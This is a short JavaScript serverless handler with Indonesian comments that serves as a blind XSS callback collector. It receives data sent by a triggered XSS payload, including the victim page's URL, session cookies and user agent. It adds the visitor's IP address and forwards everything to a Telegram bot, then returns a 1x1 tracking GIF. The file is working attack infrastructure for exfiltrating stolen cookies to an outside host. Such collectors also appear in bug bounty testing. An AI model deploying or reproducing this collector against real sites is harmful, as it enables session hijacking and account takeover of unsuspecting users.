// ⚠️ JANGAN LANGSUNG TULIS TOKEN DI SINI!
// Nanti token dimasukin lewat Environment Variables di Vercel

export default async (req, res) => {
  // Hanya terima method POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Ambil data dari payload
  const { marker, url, cookies, userAgent } = req.body;
  
  // Ambil token & chat ID dari environment variables Vercel
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  console.log(`[XSS] Marker: ${marker} | URL: ${url}`);

  // Kirim notifikasi ke Telegram (cuma kalo token ada)
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'ISI_TOKEN_BOT_LO') {
    const message = `🔥 *BLIND XSS TRIGGERED!* 🔥
       
📌 *Marker*: ${marker || 'tidak ada'}
🌐 *URL*: ${url || 'tidak diketahui'}
🍪 *Cookie*: ${cookies || 'tidak ada'}
📱 *User Agent*: ${userAgent || 'tidak ada'}
💻 *IP Address*: ${req.headers['x-forwarded-for'] || 'tidak diketahui'}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  }

  // Balikin gambar 1x1 pixel transparan (base64 yang bener)
  res.setHeader('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
};
